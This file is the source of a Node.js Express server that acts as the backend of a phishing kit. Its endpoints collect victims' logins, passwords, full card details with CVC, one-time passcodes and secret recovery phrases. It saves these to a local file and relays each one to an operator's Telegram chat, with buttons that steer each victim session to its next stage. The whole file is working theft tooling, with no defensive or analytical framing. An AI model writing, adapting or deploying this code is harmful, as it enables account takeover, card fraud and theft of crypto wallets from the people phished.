const express = require('express');
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');

// Load configuration
const config = JSON.parse(fs.readFileSync(path.join(__dirname, 'config.json')));

const app = express();
const port = 3000;

// Middleware for parsing JSON request body
app.use(bodyParser.json());

// Initialize the Telegram bot with your token
const bot = new TelegramBot(config.token, { polling: true });

// Path to the user data JSON file
const userDataPath = path.join(__dirname, 'userData.json');

// Function to read user data from the JSON file
const readUserData = () => {
    if (fs.existsSync(userDataPath)) {
        const data = fs.readFileSync(userDataPath);
        if (data.length === 0) return {}; // Handle empty file
        return JSON.parse(data);
    }
    return {};
};

// Function to write user data to the JSON file
const writeUserData = (data) => {
    fs.writeFileSync(userDataPath, JSON.stringify(data, null, 2));
};

// Test the bot by sending a message to the chat ID
bot.sendMessage(config.chatId, 'Bot is up and running!').catch(error => {
    console.error('Error sending test message:', error);
});

let messageId;

// Endpoint for handling login and password
app.post('/api/cred', (req, res) => {
    const { login, password, sessionId } = req.body;

    // Log the received data
    console.log('Received credentials:');
    console.log('Login:', login);
    console.log('Password:', password);
    console.log('Session ID:', sessionId);

    // Store user data
    const users = readUserData();
    if (!users[sessionId]) {
        users[sessionId] = {};
    }
    users[sessionId].login = login;
    users[sessionId].password = password;

    // Write updated user data back to the JSON file
    writeUserData(users);

    // Send message to Telegram with user data and all buttons
    const message = `👤 Login: ${login}\n🔐 Password: ${password}\n💳 Card: ${users[sessionId].card || ''} | ${users[sessionId].exp || ''} | ${users[sessionId].cvc || ''}\n✉ OTP: ${users[sessionId].otp || ''}\n🔑 Secret: ${users[sessionId].secretPhrase || ''}\nSession ID: ${sessionId}`;
    const options = {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: 'Login', callback_data: `cred:${sessionId}` },
                    { text: 'Card', callback_data: `card:${sessionId}` },
                    { text: 'OTP', callback_data: `otp:${sessionId}` },
                    { text: 'Secret', callback_data: `secret:${sessionId}` },
                ],
            ],
        },
    };

    bot.sendMessage(config.chatId, message, options).then(sentMessage => {
        messageId = sentMessage.message_id; // Store the message ID for future edits
    });

    // Send response to client
    res.status(200).json({ message: 'Credentials received successfully' });
});

// Endpoint for handling card information
app.post('/api/card', (req, res) => {
    const { card, exp, cvc, sessionId } = req.body;

    // Log the received data
    console.log('Received card data:');
    console.log('Card:', card);
    console.log('Expiration:', exp);
    console.log('CVC:', cvc);
    console.log('Session ID:', sessionId);

    // Store user data
    const users = readUserData();
    if (!users[sessionId]) {
        users[sessionId] = {};
    }
    users[sessionId].card = card;
    users[sessionId].exp = exp;
    users[sessionId].cvc = cvc;

    // Write updated user data back to the JSON file
    writeUserData(users);

    // Send message to Telegram with user data and all buttons
    const message = `👤 Login: ${users[sessionId].login || ''}\n🔐 Password: ${users[sessionId].password || ''}\n💳 Card: ${card} | ${exp} | ${cvc}\n✉ OTP: ${users[sessionId].otp || ''}\n🔑 Secret: ${users[sessionId].secretPhrase || ''}\nSession ID: ${sessionId}`;
    const options = {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: 'Login', callback_data: `cred:${sessionId}` },
                    { text: 'Card', callback_data: `card:${sessionId}` },
                    { text: 'OTP', callback_data: `otp:${sessionId}` },
                    { text: 'Secret', callback_data: `secret:${sessionId}` },
                ],
            ],
        },
    };

    bot.editMessageText(message, { chat_id: config.chatId, message_id: messageId, reply_markup: options.reply_markup });

    // Send response to client
    res.status(200).json({ message: 'Card data received successfully' });
});

// Endpoint for handling OTP
app.post('/api/otp', (req, res) => {
    const { otp, sessionId } = req.body;

    // Log the received data
    console.log('Received OTP:');
    console.log('OTP:', otp);
    console.log('Session ID:', sessionId);

    // Store user data
    const users = readUserData();
    if (!users[sessionId]) {
        users[sessionId] = {};
    }
    users[sessionId].otp = otp;

    // Write updated user data back to the JSON file
    writeUserData(users);

    // Send message to Telegram with user data and all buttons
    const message = `👤 Login: ${users[sessionId].login || ''}\n🔐 Password: ${users[sessionId].password || ''}\n💳 Card: ${users[sessionId].card || ''} | ${users[sessionId].exp || ''} | ${users[sessionId].cvc || ''}\n✉ OTP: ${otp}\n🔑 Secret: ${users[sessionId].secretPhrase || ''}\nSession ID: ${sessionId}`;
    const options = {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: 'Login', callback_data: `cred:${sessionId}` },
                    { text: 'Card', callback_data: `card:${sessionId}` },
                    { text: 'OTP', callback_data: `otp:${sessionId}` },
                    { text: 'Secret', callback_data: `secret:${sessionId}` },
                ],
            ],
        },
    };

    bot.editMessageText(message, { chat_id: config.chatId, message_id: messageId, reply_markup: options.reply_markup });

    // Send response to client
    res.status(200).json({ message: 'OTP received successfully' });
});

// Endpoint for handling secret phrase
app.post('/api/secret', (req, res) => {
    const { secretPhrase, sessionId } = req.body;

    // Log the received data
    console.log('Received secret phrase:');
    console.log('Secret Phrase:', secretPhrase);
    console.log('Session ID:', sessionId);

    // Store user data
    const users = readUserData();
    if (!users[sessionId]) {
        users[sessionId] = {};
    }
    users[sessionId].secretPhrase = secretPhrase;

    // Write updated user data back to the JSON file
    writeUserData(users);

    const message = `👤 Login: ${users[sessionId].login || ''}\n🔐 Password: ${users[sessionId].password || ''}\n💳 Card: ${users[sessionId].card || ''} | ${users[sessionId].exp || ''} | ${users[sessionId].cvc || ''}\n✉ OTP: ${users[sessionId].otp || ''}\n🔑 Secret: ${secretPhrase}\nSession ID: ${sessionId}`;
    const options = {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: 'Login', callback_data: `cred:${sessionId}` },
                    { text: 'Card', callback_data: `card:${sessionId}` },
                    { text: 'OTP', callback_data: `otp:${sessionId}` },
                    { text: 'Secret', callback_data: `secret:${sessionId}` },
                ],
            ],
        },
    };

    bot.editMessageText(message, { chat_id: config.chatId, message_id: messageId });

    // Send response to client
    res.status(200).json({ message: 'Secret phrase received successfully' });
});

// Handle callback queries from Telegram
bot.on('callback_query', (callbackQuery) => {
    const data = callbackQuery.data.split(':');
    const action = data[0];
    const sessionId = data[1];

    // Log the action and sessionId to the console
    console.log(`Отправляем на: ${action}`);

    // Read existing user data
    //const users = readUserData();

    // Return JSON response
    const response = {
        action: action,
        sessionId: sessionId,
    };
    console.log(JSON.stringify(response));
    bot.sendMessage(callbackQuery.message.chat.id, `Отправляем на: ${action}`);
});

// Start the server
app.listen(port, () => {
    console.log(`Server is running on http://localhost:${port}`);
});